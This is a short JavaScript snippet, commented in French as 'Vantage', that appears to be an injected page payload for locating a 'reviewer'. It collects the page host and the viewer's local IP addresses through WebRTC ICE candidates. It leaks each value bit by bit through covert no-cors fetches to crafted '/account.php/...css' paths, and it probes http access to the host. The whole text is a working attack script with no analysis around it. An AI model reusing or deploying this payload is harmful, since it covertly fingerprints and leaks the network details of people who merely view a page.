/* Vantage - localisation du reviewer : hote de la page + adresse locale via WebRTC. */
(function () {
  function b(t) {
    try { fetch('/account.php/W' + t + '.css', { mode: 'no-cors', cache: 'no-store', keepalive: true }); } catch (e) {}
  }
  function send(pfx, s) {
    b(pfx + 'L' + s.length);
    for (var i = 0; i < s.length && i < 40; i++) {
      var c = s.charCodeAt(i);
      for (var j = 0; j < 8; j++) { if ((c >> j) & 1) b(pfx + i + 'b' + j); }
    }
  }
  b('exec');
  send('H', location.host);
  fetch('http://' + location.host + '/', { mode: 'no-cors' })
    .then(function () { b('ctlok'); }).catch(function () { b('ctlno'); });
  try {
    var pc = new RTCPeerConnection({ iceServers: [] });
    var seen = {};
    pc.createDataChannel('x');
    pc.onicecandidate = function (e) {
      if (!e.candidate) return;
      var m = /(\d+\.\d+\.\d+\.\d+)/.exec(e.candidate.candidate);
      if (m && !seen[m[1]]) { seen[m[1]] = 1; send('I', m[1]); }
    };
    pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
  } catch (e) { b('rtcno'); }
})();
